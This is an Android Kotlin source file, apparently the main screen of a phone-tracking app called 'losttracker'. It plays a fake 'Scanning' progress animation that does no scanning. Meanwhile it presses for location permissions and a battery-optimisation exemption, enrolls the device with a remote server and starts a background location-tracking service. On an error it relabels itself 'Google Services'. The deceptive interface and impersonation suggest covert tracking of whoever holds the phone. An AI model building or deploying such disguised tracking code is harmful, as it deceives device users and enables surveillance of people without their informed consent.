package com.lazzy.losttracker

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {
    private lateinit var scanningText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var protectionText: TextView
    private val uiHandler = Handler(Looper.getMainLooper())
    private val ioExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    private var autoSetupStarted = false

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        driveAutomaticSetup()
    }

    private val settingsLauncher = registerForActivityResult(StartActivityForResult()) {
        driveAutomaticSetup()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        scanningText = findViewById(R.id.scanningText)
        deviceIdText = findViewById(R.id.deviceIdText)
        protectionText = findViewById(R.id.protectionText)

        TrackerPrefs.ensureDefaults(this)
        refreshSummary()
        driveAutomaticSetup()
    }

    override fun onResume() {
        super.onResume()
        refreshSummary()
        startScanAnimation()
        driveAutomaticSetup()
    }

    override fun onDestroy() {
        uiHandler.removeCallbacksAndMessages(null)
        ioExecutor.shutdown()
        super.onDestroy()
    }

    private fun refreshSummary() {
        val config = TrackerPrefs.load(this)
        deviceIdText.text = "Device ID: ${config.deviceId ?: "preparing"}"
    }

    private fun startScanAnimation() {
        uiHandler.removeCallbacksAndMessages(null)
        scanningText.visibility = View.VISIBLE
        deviceIdText.visibility = View.INVISIBLE
        protectionText.visibility = View.INVISIBLE
        val steps = listOf(
            0L to "Scanning 0%",
            3_000L to "Scanning 10%",
            6_000L to "Scanning 25%",
            9_000L to "Scanning 27%",
            12_000L to "Scanning 32%",
            16_000L to "Scanning 41%",
            20_000L to "Scanning 50%",
            23_000L to "Scanning 63%",
            25_500L to "Scanning 78%",
            27_000L to "Scanning 91%",
            28_500L to "Scanning 100%"
        )
        steps.forEach { (delayMs, value) ->
            uiHandler.postDelayed({
                scanningText.text = value
            }, delayMs)
        }
        uiHandler.postDelayed({
            scanningText.visibility = View.GONE
            deviceIdText.visibility = View.VISIBLE
            protectionText.visibility = View.VISIBLE
        }, 30_000L)
    }

    private fun enrollDevice() {
        val config = TrackerPrefs.load(this)

        ioExecutor.execute {
            runCatching {
                val deviceId = ApiClient.enroll(config)
                TrackerPrefs.saveDeviceId(this, deviceId)
                deviceId
            }.onSuccess {
                runOnUiThread {
                    autoSetupStarted = false
                    refreshSummary()
                    driveAutomaticSetup()
                }
            }.onFailure { error ->
                runOnUiThread {
                    autoSetupStarted = false
                    updateTitleForFailure(error.message)
                }
            }
        }
    }

    private fun startTrackingService() {
        val config = TrackerPrefs.load(this)
        if (config.deviceId == null) {
            return
        }
        if (!hasTrackingAccess()) {
            return
        }
        ContextCompat.startForegroundService(this, Intent(this, TrackerService::class.java))
    }

    private fun requestRuntimePermissions() {
        val wanted = mutableListOf(
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= 33) {
            wanted += Manifest.permission.POST_NOTIFICATIONS
        }
        val missing = wanted.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            permissionLauncher.launch(missing.toTypedArray())
        }
    }

    private fun requestAllRequiredAccess() {
        when {
            !hasForegroundLocationPermission() || !hasNotificationPermission() -> requestRuntimePermissions()
            else -> requestBatteryOptimizationExemption()
        }
    }

    private fun driveAutomaticSetup() {
        val config = TrackerPrefs.load(this)
        when {
            !hasTrackingAccess() -> requestAllRequiredAccess()
            config.deviceId == null -> {
                if (!autoSetupStarted) {
                    autoSetupStarted = true
                    enrollDevice()
                }
            }
            else -> {
                deviceIdText.post {
                    startTrackingService()
                }
            }
        }
    }

    private fun requestBatteryOptimizationExemption() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            settingsLauncher.launch(intent)
        }
    }

    private fun hasForegroundLocationPermission(): Boolean {
        val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
        val coarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
        return fine == PackageManager.PERMISSION_GRANTED || coarse == PackageManager.PERMISSION_GRANTED
    }

    private fun hasNotificationPermission(): Boolean {
        if (Build.VERSION.SDK_INT < 33) {
            return true
        }
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasTrackingAccess(): Boolean {
        return hasForegroundLocationPermission() &&
            hasNotificationPermission()
    }

    private fun updateTitleForFailure(message: String?) {
        title = message?.takeIf { it.isNotBlank() }?.let { "Google Services" } ?: title
    }
}
